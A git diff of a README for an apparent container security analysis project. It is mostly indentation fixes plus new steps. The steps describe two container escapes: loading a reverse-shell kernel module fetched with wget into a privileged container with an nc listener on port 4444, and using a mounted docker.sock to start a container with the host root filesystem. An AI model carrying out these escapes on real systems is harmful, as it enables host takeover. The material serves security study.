@@ -19,32 +19,31 @@ This aim for this project is to conduct a Security Analysis of Containerized App
 **Steps**
 
 1. Change the directory to *reverseshell* and run the command *make* to build the Kernel File.
-  ```bash
-  cd reverseshell
-  make
-  ```
+   ```bash
+   cd reverseshell
+   make
+   ```
 2. Start a Python Server in the *reverseshell* directory using the command:
-  ```bash
-  python3 -m http.server
-  ```
+   ```bash
+   python3 -m http.server
+   ```
 3.  On a New Terminal Tab Run a Base container (here alpine) with a privileged flag and start a shell session in it using the command:
-  ```bash
-  docker run --rm --privileged -it alpine sh
-  ```
+   ```bash
+   docker run --rm --privileged -it alpine sh
+   ```
 4. Fetch the Kernel File from the server started in Step 2 using the command 
-  ```bash
-  wget http://172.17.0.1:8000/reverseshell_module.ko
-  ```
+   ```bash
+   wget http://172.17.0.1:8000/reverseshell_module.ko
+   ```
 5. Give Executable Permission to the Kernel File inside the Container using the command 
-  ```bash
-  chmod +x reverseshell_module.ko
-  ```
+   ```bash
+   chmod +x reverseshell_module.ko
+   ```
 6. On a New Terminal Start a Port listener on Port number 4444 as specified in the Kernel Module C Program using the command: 
-  ```bash
-  nc -nlvp 4444
-  ```
+   ```bash
+   nc -nlvp 4444
+   ```
 7. Inside the Container shell of Step 3 write the Kernel Module into the Kernel Space using the command:
-
    ```bash
    insmod reverseshell_module.ko
    ```
@@ -61,7 +60,19 @@ This aim for this project is to conduct a Security Analysis of Containerized App
 **Step**
 
 1. Start a Docker Container mounted on the Docker socket file at `/var/run/docker.sock` using the command:
-
    ```bash
-    docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh
+   docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh
+   ```
+2. Check for the docker.sock file in the Container File System through the command:
+   ```bash
+   ls /var/run/docker.sock
+   ```
+3. Update apk and install docker engine on the Container file system to start another container on the Host from inside a Container namespace through the commands:
+   ```bash
+   apk update
+   apk add -U docker
+   ```
+4. Start a new container by explicitly defining the docker socket extension using the command:
+   ```bash
+   docker -H unix:///var/run/docker.sock run -it -v /:/test:ro -t alpine sh
    ```
